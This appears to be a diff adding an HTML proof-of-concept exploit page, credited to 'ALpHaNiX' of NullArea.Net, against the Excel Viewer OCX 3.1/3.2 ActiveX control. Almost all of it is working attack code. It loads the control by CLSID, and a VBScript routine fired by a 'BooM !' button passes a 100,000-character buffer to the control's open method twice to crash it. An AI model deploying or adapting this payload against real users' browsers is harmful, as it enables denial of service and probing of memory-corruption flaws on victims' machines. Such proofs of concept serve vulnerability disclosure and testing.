@@ -1,0 +1,20 @@
+&lt;html&gt;
+&lt;title&gt;Excel Viewer OCX 3.1/3.2 Denial of Service PoC&lt;/title&gt;
+&lt;br&gt; Excel Viewer OCX 3.1/3.2 Denial of Service PoC&lt;/br&gt;
+&lt;br&gt; By ALpHaNiX &lt;/br&gt;
+&lt;br&gt; NullArea.Net&lt;/br&gt;
+&lt;br&gt;&lt;/br&gt;
+&lt;BODY&gt;
+ &lt;object id=alpha classid=&quot;clsid:{18A295DA-088E-42D1-BE31-5028D7F9B965}&quot;&gt;&lt;/object&gt;
+&lt;script language=&#039;vbscript&#039;&gt;
+ Sub Boom
+ on error resume next
+   buff = String(100000, &quot;A&quot;)
+   alpha.open buff
+   alpha.open buff
+ End Sub
+&lt;/script&gt;
+&lt;input type=button onclick=Boom() value=&#039;BooM !&#039;&gt;
+
+&lt;/body&gt;
+&lt;/HTML&gt;
